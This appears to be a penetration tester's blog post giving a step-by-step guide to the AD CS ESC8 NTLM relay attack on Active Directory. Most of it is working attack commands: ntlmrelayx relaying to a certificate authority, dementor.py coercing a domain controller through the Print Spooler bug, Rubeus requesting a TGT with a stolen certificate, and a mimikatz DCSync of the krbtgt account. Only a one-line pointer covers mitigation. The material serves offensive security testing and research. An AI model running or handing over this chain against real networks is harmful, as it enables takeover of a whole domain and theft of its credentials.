---
title: AD CS relay attack  - practical guide
layout: post
---

Unless you are living under the rock, you have seen that recently [@harmj0y](https://twitter.com/harmj0y){:target="blank"} and [@tifkin_](https://twitter.com/tifkin_){:target="blank"}  published their amazing research on Active Directory Certificate Services (AD CS). If you haven't checked it out already read their [post](https://posts.specterops.io/certified-pre-owned-d95910965cd2){:target="blank"} first.

While reading their research, one specific misconfiguration caught my attention, it was "NTLM Relay to AD CS HTTP Endpoints — ESC8". In their blog post and whitepaper, they explain it in more detail, but basically, this misconfiguration lets the attacker relay user/machine authentication to the AD CS server and obtain a user/machine certificate. Once the attacker obtains the certificate, the attacker can request user/machine TGT and become that user/machine on the network. 

Since there was not public PoC for this misconfiguration and I had an upcoming pentest, I've decided to dig into it myself and try to implement it. 
I've ended up implementing this attack in impacket's "ntlmrelayx.py" tool. Currently it's an active [pull request](https://github.com/SecureAuthCorp/impacket/pull/1101){:target="blank"}.

### How to perform the attack?
To perform the attack we need ntlmrelayx listening for authentication and relaying it to the AD CS  server, as well as a way to coerce user/machine NTLM authentication to us.
There are plenty of ways of coercing user/machine authentication to a specific server, but for this guide, I will demonstrate coercing machine's authentication via well known "Print Spooler" bug.
##### *Oh yeah if you didn’t know, the print spooler attack is still valid and working fine on up-to-date windows servers.*
<br/>
Run the ntlmrelayx.py and set your Certificate Authority (CA) as a target:
``` text
python3 ntlmrelayx.py -t http://<ca-server>/certsrv/certfnsh.asp -smb2support --adcs
```

To coerce authentication of a domain controller machine I will use [dementor.py](https://github.com/NotMedic/NetNTLMtoSilverTicket/blob/master/dementor.py){:target="blank"} script to exploit the print spooler bug:
``` text
python3 dementor.py <listener> <target> -u <username> -p <password> -d <domain>
```
##### Quick tip, if dementor.py throws an error, in line 10 change "ConfigParser" to the lowercase "configparser"
<br/>
![ntlmrelayx-dementor](/assets/ntlmrelayx-dementor.png){: .center-image }

If authentication is successful ntlmrelayx will generate a new Certificate Sign Request (CSR), submit it to the CA to be signed, and download the certificate. The certificate will be displayed as a base64 blob to make it easier to use with Rubeus.

Once you've obtained the certificate you have basically owned the user/machine. All you have to do now is to request a TGT with the certificate. You can do this with [Rubeus](https://github.com/GhostPack/Rubeus){:target="blank"}.

``` text
Rubeus.exe asktgt /user:<user> /certificate:<base64-certificate> /ptt
```
``` text
Rubeus.exe asktgt /user:dc1$ /certificate:MIIRdQIBAzCCET8GCSqGSIb3DQEHAaCCETAEghEsMIIRKDCCB18GCSqGSIb3DQEHBqCCB1AwggdMAgEAMIIHRQYJKoZIhvcNAQcBMBwGCiqGSIb3DQEMAQMwDgQIMlK4N+sfacMCAggAgIIHGPCx+sJcjQRGbQANC3ePKIKAOfNeI9wgyOOXfMBWms3IAtVA2EZ0b78ky5vomY9alQdXqnDsNwdTSiBwCrM2pjrOCKkK7k12ZUdyMmL1fHC6tEv1ZQ1ERua9efEJF/uECAirxbWtwG/PImwzYNK+H8Pf0d6Yn763640sZIz6ZCe4aSJLlnhyuCjPfvB+CPIYKdmOhK8sNVb28xii71...<snip>...+NfrHtK8fzQxPG8vcBKrbW5104J399ScrUqg5tb3E3wsJeOFrxw3EKTRDElMCMGCSqGSIb3DQEJFTEWBBRJcYgdQp5tsPzn4fZ44dvnJGD/4TAtMCEwCQYFKw4DAhoFAAQUpPhhGxvtl866a+BRgIx397lDNg4ECNraSKImUUXS /ptt
```
<br/>
![ntlmrelayx-dementor](/assets/rubeus.png){: .center-image }
<br/>
![ntlmrelayx-dementor](/assets/klist.png){: .center-image }

TGT has been obtained and imported successfully. To make sure it works you can now perform a DCSync attack with mimikatz.

``` text
mimikatz # lsadump::dcsync /user:krbtgt
```

![ntlmrelayx-dementor](/assets/mimikatz.png){: .center-image }

### Mitigation
For mitigation check out the official [whitepaper](https://www.specterops.io/assets/resources/Certified_Pre-Owned.pdf){:target="blank"} under the "Harden AD CS HTTP Endpoints – PREVENT8" title.

## Conclusion
In this guide, I have demonstrated how you can obtain a domain controller's machine certificate and abuse it to compromise the whole domain. Keep in mind this can attack can be used to obtain certificates of other windows (server) machines (not only domain controllers) as well as user accounts. If you would like to perform the attack against user accounts you would need to somehow coerce a user to authenticate to your server (where ntlmrelayx is running) as well as run ntlmrelayx with the "--template User" flag. In the future post, I will show how to attack the user accounts with this attack.

### Credits
All credits for this research goes to [@harmj0y](https://twitter.com/harmj0y){:target="blank"} and [@tifkin_](https://twitter.com/tifkin_){:target="blank"}. I've just implemented the attack in the impacket's ntlmrelayx tool and demonstrated how to use it.

The end!
